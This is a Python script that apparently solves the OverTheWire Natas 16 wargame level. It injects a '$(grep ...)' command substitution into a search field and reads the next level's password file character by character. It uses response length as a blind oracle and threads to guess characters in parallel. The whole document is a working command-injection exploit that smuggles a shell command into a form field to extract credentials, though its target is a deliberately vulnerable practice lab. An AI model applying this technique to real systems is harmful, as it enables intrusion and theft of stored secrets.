import requests
import string
import threading

url = "http://natas16.natas.labs.overthewire.org/"
charset = string.ascii_letters + string.digits
this_password = "[NATAS16 PASSWORD]"

session = requests.Session()
session.auth = ('natas16', this_password)

dots = '' # We add a dot to the grep injection every time we find a character, this is just how we check a character at a time
password = ''

def check_element(guess):
    global password
    payload = f'$(grep -o ^{dots + guess} /etc/natas_webpass/natas17)' # grep the nth character of the password and search the dictionary for the result
    query_params = {
        'needle': payload,
        'submit': 'Search'
    }
    response = session.get(url, params = query_params)
    if response.headers.get('Content-Length') != None: # If the grep returns nothing, ie our guess was wrong, then the webpage returns the entire dictionary. If it doesn't do this, we know our guess was right.
                                                       # Content-Length is None because if a response is too large, it is streamed in chunks, and therefore the Content-Length must be found at arrival. In this case this works in our favour.
        password += guess
    return None


for i in range(1, 33):
    threads=[] 
    for guess in charset: # Create a thread for every character in the charset. Each thread tries a single character.
        t = threading.Thread(target=check_element, args = (guess,))
        threads.append(t)
    for t in threads:
        t.start() # Run every thread
    for t in threads:
        t.join() # Make sure they've all completed before we move on
    dots += '.'
    print(f'Found character {i}. Password so far is {password}.')

print(password)